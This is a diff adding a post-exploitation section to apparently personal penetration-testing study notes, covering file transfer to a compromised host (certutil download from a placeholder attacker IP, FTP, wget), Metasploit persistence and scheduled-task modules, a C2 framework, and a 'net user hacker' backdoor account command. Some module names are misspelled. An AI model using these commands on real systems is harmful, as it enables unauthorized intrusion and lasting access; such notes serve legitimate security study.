@@ -383,4 +383,33 @@
 
 ## Post Exploitation
 
-### 20/148...
+### File Transfers Review
+
+* Certutil: `certutil -urlcache -f http://<source IP>/file.txt file.txt`
+* HTTP: `python3 -m http.server 80`
+* Browser: navigate directly to file
+* FTP: `python -m pyftpdlib 21` on attacker machine
+* grab a file from attacker machine's FTP: `ftp <IP attacker machine's IP>
+* Linux `wget`
+* Metasploit use the ***upload*** and/or ***download*** feature
+
+### Maintaining Access
+
+* If something happens to the machine we are on (target) we can gain access back.
+* This can be accomplished via a C2 (Command & Conquer) framework such as **Covenant**.
+* Adding a User (this will add a user via an unauthenticated port)
+
+#### Maintaining access with Metasploit
+
+* `run presistence -h`
+* `exploit/windows/local/presistence`
+* `exploit/windows/local/registry_presistence`
+
+#### Run scheduled tasks with Metasploit
+
+* `run scheduleme`
+* `run schtaskabuse`
+
+#### Add a User on Windows
+
+* `net user hacker password123 /add`
